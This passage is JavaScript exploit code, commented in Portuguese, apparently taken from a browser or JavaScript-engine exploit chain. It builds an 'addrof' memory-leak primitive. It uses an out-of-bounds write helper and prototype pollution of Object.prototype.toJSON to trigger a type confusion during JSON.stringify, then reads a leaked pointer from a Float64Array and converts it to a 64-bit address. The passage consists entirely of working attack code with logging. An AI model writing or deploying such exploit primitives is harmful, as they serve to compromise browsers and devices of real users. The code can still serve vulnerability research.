    _heisenbugConfirmedByProbe_core = false;      // Usa variável renomeada
    let addrof_result_internal = { success: false, message: "Addrof (Heisenbug) não iniciado.", leaked_address_as_double: NaN, leaked_address_as_int64: null };
    let originalToJSONDescriptorForCoreAddrof = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    let pollutedByCoreAddrof = false;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) { throw new Error("Ambiente OOB não pôde ser inicializado para Addrof."); }
        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET, HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        await PAUSE(100);
        let confused_ab_candidate = new ArrayBuffer(HEISENBUG_VICTIM_AB_SIZE);
        let float_view_on_confused_ab = new Float64Array(confused_ab_candidate);
        const fillPatternForAddrof = 0.445566778812345; // Padrão ligeiramente diferente para diferenciar
        float_view_on_confused_ab.fill(fillPatternForAddrof);
        
        Object.defineProperty(Object.prototype, 'toJSON', { value: _toJSONProbeForAddrofInCoreInternal, writable: true, configurable: true, enumerable: false }); // Usa função renomeada
        pollutedByCoreAddrof = true;
        JSON.stringify(confused_ab_candidate);
        
        if (_heisenbugConfirmedByProbe_core) { // Usa variável renomeada
            const val_double = float_view_on_confused_ab[0];
            addrof_result_internal.leaked_address_as_double = val_double;
            log(`[${FNAME_FUNC}] Heisenbug confirmada. Valor lido como double: ${val_double} (Hex: ${toHex(new Float64Array([val_double]).buffer, 64)})`, 'leak');

            if (val_double === fillPatternForAddrof) {
                 addrof_result_internal.message = "Heisenbug ocorreu, mas valor no buffer não foi alterado (ainda é o fillPattern). Addrof falhou.";
            } else {
                const db_conv_buf = new ArrayBuffer(8); 
                new Float64Array(db_conv_buf)[0] = val_double;
                const dv_conv_i = new Uint32Array(db_conv_buf);
                const potential_addr = new AdvancedInt64(dv_conv_i[0], dv_conv_i[1]);
                addrof_result_internal.leaked_address_as_int64 = potential_addr.toString(true);
                log(`[${FNAME_FUNC}] Convertido para Int64: ${potential_addr.toString(true)}`, 'leak');

                // A checagem de validade de ponteiro aqui é um pouco diferente/mais branda que isValidPointer global
                // Se high part não é zero OU low part não é zero (e não é o fill pattern)
                // E não é um NaN/Infinity óbvio (o check de fillPattern ajuda aqui)
                if ( !(potential_addr.high() === 0 && potential_addr.low() === 0) &&
                     !((potential_addr.high() & 0x7FF00000) === 0x7FF00000) && // Não é NaN/Inf
                     val_double !== 0 // Evita 0.0
                   ) {
                    addrof_result_internal.success = true;
                    addrof_result_internal.message = "Addrof (Heisenbug) supostamente bem-sucedido. Verifique o valor.";
                } else { 
                    addrof_result_internal.message = `Heisenbug ocorreu, mas valor lido (${potential_addr.toString(true)}) não parece endereço válido.`; 
                }
            }
        } else { 
            addrof_result_internal.message = "Heisenbug não foi confirmada pela sonda."; 
        }
    } catch (e) { 
        addrof_result_internal.message = `Erro crítico em Addrof: ${e.message}`;
        log(`[${FNAME_FUNC}] Exception: ${e.message}`, 'critical');
    } finally {
        if (pollutedByCoreAddrof) {
            if (originalToJSONDescriptorForCoreAddrof) Object.defineProperty(Object.prototype, 'toJSON', originalToJSONDescriptorForCoreAddrof);
            else delete Object.prototype.toJSON;
        }
        _targetObjectForAddrofProbe_core = null; // Usa variável renomeada
    }
    log(`[${FNAME_FUNC}] Resultado: ${JSON.stringify(addrof_result_internal)}`, addrof_result_internal.success ? 'good' : 'warn');
    return addrof_result_internal;
}
